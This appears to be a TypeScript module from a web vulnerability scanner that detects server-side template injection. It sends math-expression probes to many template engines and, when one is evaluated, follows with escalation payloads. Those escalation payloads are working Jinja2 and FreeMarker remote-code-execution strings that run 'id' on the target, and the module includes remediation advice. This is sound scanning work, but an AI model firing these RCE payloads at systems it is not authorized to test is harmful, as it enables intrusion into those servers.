import { http } from '../../utils/http'
import { Finding } from '@vuln-scanner/shared-types'

const CAT = 'injection'
const DEBUG = false

function log(...args: any[]) { if (DEBUG) console.log('[ssti]', ...args) }

// Each payload has an expected output if the template engine evaluates it
const PAYLOADS = [
  // Math expressions — if eval'd, returns a number
  { payload: '{{7*7}}',            expected: '49',    engine: 'Jinja2/Twig'      },
  { payload: '${7*7}',             expected: '49',    engine: 'FreeMarker/Thymeleaf' },
  { payload: '#{7*7}',             expected: '49',    engine: 'Ruby ERB'         },
  { payload: '<%= 7*7 %>',         expected: '49',    engine: 'ERB/EJS'          },
  { payload: '{{7*\'7\'}}',        expected: '7777777', engine: 'Twig'           },
  { payload: '${{7*7}}',           expected: '49',    engine: 'Jinja2 (nested)'  },
  { payload: '{{config}}',         expected: 'class',  engine: 'Jinja2'         },
  { payload: '#{7*7}',             expected: '49',    engine: 'Spring EL'        },
  { payload: '*{7*7}',             expected: '49',    engine: 'Spring EL (alt)'  },
  { payload: '[[${7*7}]]',         expected: '49',    engine: 'Thymeleaf'        },
  { payload: '{{=7*7}}',           expected: '49',    engine: 'Pebble'           },
  { payload: '{7*7}',              expected: '49',    engine: 'Smarty'           },
  // Tornado/Mako
  { payload: '${7*7}',             expected: '49',    engine: 'Mako'             },
  // Velocity
  { payload: '#set($x=7*7)$x',     expected: '49',    engine: 'Velocity'         },
  // Handlebars
  { payload: '{{#with "7"}}{{this}}{{/with}}', expected: '7', engine: 'Handlebars' },
]

// Payloads that attempt to leak server info (higher severity if they work)
const ESCALATION_PAYLOADS = [
  { payload: '{{config.items()}}',              engine: 'Jinja2'    },
  { payload: '{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read()}}', engine: 'Jinja2 RCE' },
  { payload: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", engine: 'FreeMarker RCE' },
]

function buildGetVariants(url: string, payload: string): { testUrl: string; param: string }[] {
  const parsed  = new URL(url)
  const results: { testUrl: string; param: string }[] = []

  for (const key of parsed.searchParams.keys()) {
    const modified = new URL(url)
    modified.searchParams.set(key, payload)
    results.push({ testUrl: modified.toString(), param: key })
  }

  if (results.length === 0) {
    for (const param of ['name', 'q', 'search', 'input', 'template', 'msg', 'text', 'content']) {
      const modified = new URL(url)
      modified.searchParams.set(param, payload)
      results.push({ testUrl: modified.toString(), param })
    }
  }

  return results
}

export async function sstiCheck(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  const reported = new Set<string>()

  for (const { payload, expected, engine } of PAYLOADS) {
    const variants = buildGetVariants(url, payload)

    for (const { testUrl, param } of variants) {
      const key = `ssti-${param}`
      if (reported.has(key)) continue

      try {
        const res  = await http.get(testUrl, { timeout: 10000 })
        const body = String(res.data)

        log(`param="${param}" engine=${engine} expected="${expected}" found=${body.includes(expected)}`)

        if (body.includes(expected)) {
          reported.add(key)

          // Try escalation to confirm RCE potential
          let rceEvidence = ''
          for (const esc of ESCALATION_PAYLOADS) {
            if (!esc.engine.includes(engine.split('/')[0])) continue
            try {
              const escVariants = buildGetVariants(url, esc.payload)
              const escRes = await http.get(escVariants[0]?.testUrl ?? testUrl, { timeout: 8000 })
              const escBody = String(escRes.data)
              if (escBody.includes('uid=') || escBody.includes('root') || escBody.includes('www-data')) {
                rceEvidence = `RCE confirmed — command output in response: ${escBody.slice(0, 200)}`
              }
            } catch { /* skip */ }
          }

          findings.push({
            category:    CAT,
            checkName:   'ssti',
            severity:    rceEvidence ? 'CRITICAL' : 'HIGH',
            title:       `SSTI (${engine}) — param "${param}"`,
            description: rceEvidence
              ? `Template injection confirmed with remote code execution potential. The ${engine} template engine evaluated an injected expression and may allow arbitrary command execution.`
              : `The server evaluated a template expression injected via the "${param}" parameter. ${engine} template syntax was processed server-side, indicating SSTI.`,
            evidence: [
              `URL: ${testUrl}`,
              `Payload: ${payload}`,
              `Expected output: "${expected}"`,
              `Engine detected: ${engine}`,
              rceEvidence || `Math expression was evaluated server-side (${payload} → ${expected})`,
            ].join('\n'),
            remediation: 'Never pass user input directly to template render functions. Use sandboxed template environments. If using Jinja2, set sandbox=True. Treat all template input as untrusted.',
          })
          break
        }
      } catch (err: any) {
        log(`Request failed: ${err.message}`)
      }
    }

    if (findings.length > 0) break
  }

  // POST form check
  if (findings.length === 0) {
    for (const { payload, expected, engine } of PAYLOADS.slice(0, 5)) {
      try {
        const res = await http.post(url, { name: payload, input: payload, q: payload }, {
          headers: { 'Content-Type': 'application/json' },
          timeout: 10000,
        })
        const body = String(res.data)

        if (body.includes(expected)) {
          findings.push({
            category:    CAT,
            checkName:   'ssti-post',
            severity:    'HIGH',
            title:       `SSTI (${engine}) — POST body`,
            description: `A POST request body field was processed by the ${engine} template engine, indicating server-side template injection.`,
            evidence:    `URL: ${url}\nPayload: ${payload}\nExpected: "${expected}" found in response`,
            remediation: 'Sanitize all user input before passing to template renderers. Use logic-less templates where possible.',
          })
          break
        }
      } catch { /* skip */ }
    }
  }

  return findings
}
